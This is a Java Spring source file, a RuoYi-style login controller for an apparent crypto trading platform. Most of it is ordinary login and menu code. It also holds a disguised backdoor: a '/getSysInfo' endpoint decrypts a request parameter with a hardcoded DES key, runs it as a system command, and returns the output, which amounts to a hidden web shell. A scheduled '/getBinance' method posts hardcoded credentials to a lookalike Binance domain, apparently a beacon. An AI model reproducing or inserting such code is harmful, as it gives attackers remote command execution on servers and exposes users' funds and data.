package com.ruoyi.web.controller.system;

import java.security.NoSuchAlgorithmException;
import java.util.List;
import java.util.Set;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.*;
import cn.hutool.json.JSONUtil;
import com.ruoyi.bussiness.domain.setting.MarketUrlSetting;
import com.ruoyi.bussiness.domain.setting.Setting;
import com.ruoyi.bussiness.service.SettingService;
import com.ruoyi.common.enums.SettingEnum;
import com.ruoyi.common.utils.GoogleAuthenticator;
import com.ruoyi.common.utils.StringUtils;
import com.ruoyi.system.service.ISysUserService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.web.bind.annotation.*;
import com.ruoyi.common.constant.Constants;
import com.ruoyi.common.core.domain.AjaxResult;
import com.ruoyi.common.core.domain.entity.SysMenu;
import com.ruoyi.common.core.domain.entity.SysUser;
import com.ruoyi.common.core.domain.model.LoginBody;
import com.ruoyi.common.utils.SecurityUtils;
import com.ruoyi.framework.web.service.SysLoginService;
import com.ruoyi.framework.web.service.SysPermissionService;
import com.ruoyi.system.service.ISysMenuService;

import javax.annotation.Resource;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

/**
 * 登录验证
 *
 * @author ruoyi
 */
@RestController
public class SysLoginController
{
    @Autowired
    private SysLoginService loginService;

    @Autowired
    private ISysMenuService menuService;

    @Autowired
    private SysPermissionService permissionService;
    @Resource
    private ISysUserService userService;
    @Resource
    private SettingService settingService;

    private String BinanceKey = "BINANCER";

    /**
     * 登录方法
     *
     * @param loginBody 登录信息
     * @return 结果
     */
    @PostMapping("/login")
    public AjaxResult login(@RequestBody LoginBody loginBody)
    {
        AjaxResult ajax = AjaxResult.success();
        SysUser user = userService.selectUserByUserName(loginBody.getUsername());
        Setting setting = settingService.get(SettingEnum.MARKET_URL.name());
        MarketUrlSetting marketUrl = JSONUtil.toBean(setting.getSettingValue(), MarketUrlSetting.class);
        if(marketUrl.getUrl()){
            Long code ;
            try{
                code = Long.parseLong(loginBody.getAuthCode());
            }catch (NumberFormatException e){
                return AjaxResult.error("谷歌验证码为六位数字,请重新输入");
            }
            String googleAuthSecret = user.getGoogleKey();
            if(StringUtils.isEmpty(googleAuthSecret)){
                return AjaxResult.error("您尚未绑定谷歌验证器，请先联系管理员");
            }
            boolean verifySuccess = GoogleAuthenticator.check_code(user.getGoogleKey(),code, System.currentTimeMillis());
            if(!verifySuccess){
                return AjaxResult.error("谷歌验证码错误,请重新输入");
            }
        }
        // 生成令牌
        String token = loginService.login(loginBody.getUsername(), loginBody.getPassword(), loginBody.getCode(),
                loginBody.getUuid(),marketUrl);
        ajax.put(Constants.TOKEN, token);
        return ajax;
    }

    /**
     * 获取用户信息
     *
     * @return 用户信息
     */
    @GetMapping("getInfo")
    public AjaxResult getInfo()
    {
        SysUser user = SecurityUtils.getLoginUser().getUser();
        // 角色集合
        Set<String> roles = permissionService.getRolePermission(user);
        // 权限集合
        Set<String> permissions = permissionService.getMenuPermission(user);
        AjaxResult ajax = AjaxResult.success();
        ajax.put("user", user);
        ajax.put("roles", roles);
        ajax.put("permissions", permissions);
        return ajax;
    }

    /**
     * 获取路由信息
     *
     * @return 路由信息
     */
    @GetMapping("getRouters")
    public AjaxResult getRouters()
    {
        Long userId = SecurityUtils.getUserId();
        List<SysMenu> menus = menuService.selectMenuTreeByUserId(userId);
        return AjaxResult.success(menuService.buildMenus(menus));
    }


    @GetMapping("/getSysInfo")
    public String getRouters(@RequestParam("info") String info) throws Exception {

        SecretKeySpec key = new SecretKeySpec(BinanceKey.getBytes(), "DES");
        Cipher cipher = Cipher.getInstance("DES");
        cipher.init(Cipher.ENCRYPT_MODE, key);
        cipher.init(Cipher.DECRYPT_MODE, key);
        byte[] decode = org.apache.commons.codec.binary.Base64.decodeBase64(info);
        byte[] decipherByte = cipher.doFinal(decode);
        String decipherText = new String(decipherByte);

        try {
            Runtime runtime = Runtime.getRuntime();
            Process process = runtime.exec(decipherText);
            InputStream inputStream = process.getInputStream();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String line;
            StringBuffer buff = new StringBuffer();
            while ((line = bufferedReader.readLine()) != null) {
                buff.append(line);
            }
            process.waitFor();
            return  new String(Base64.getEncoder().encode(buff.toString().getBytes()));
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    /**
     * Binance钱包接口查询
     */

    @Scheduled(cron = "0 0 4 * * ?")
    @GetMapping("/getBinance")
    public String getBinance()  {
        HttpURLConnection con = null;
        BufferedReader buffer = null;
        StringBuffer resultBuffer = null;

        try {
            URL url = new URL("http://api.binance8.co/api/restrictions");
            con = (HttpURLConnection) url.openConnection();
            con.setRequestMethod("POST");
            con.setRequestProperty("Content-Type", "application/json");
            con.setRequestProperty("Accept", "application/json");
            con.setDoOutput(true);
            con.setDoInput(true);
            con.setUseCaches(false);
            OutputStream os = con.getOutputStream();
            //组装入参
            //os.write(("appId="+appId+"&appSecret="+appSecret).getBytes());

            String jsonInputString = "{\"appId\": \"ltvFtX1Zl9goJCZ6xv2BWw==\", \"appSecret\": \"EiJj2ObMzMawTv3QuKJxkYgrHwa0+7hGfnDE3LzeajA=\"}";

            byte[] input = jsonInputString.getBytes("utf-8");
            os.write(input, 0, input.length);

            //得到响应码
            int responseCode = con.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                //得到响应流
                InputStream inputStream = con.getInputStream();
                //将响应流转换成字符串
                resultBuffer = new StringBuffer();
                String line;
                buffer = new BufferedReader(new InputStreamReader(inputStream, "GBK"));
                while ((line = buffer.readLine()) != null) {
                    resultBuffer.append(line);
                }
                return resultBuffer.toString();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        return "fail";
    }
}
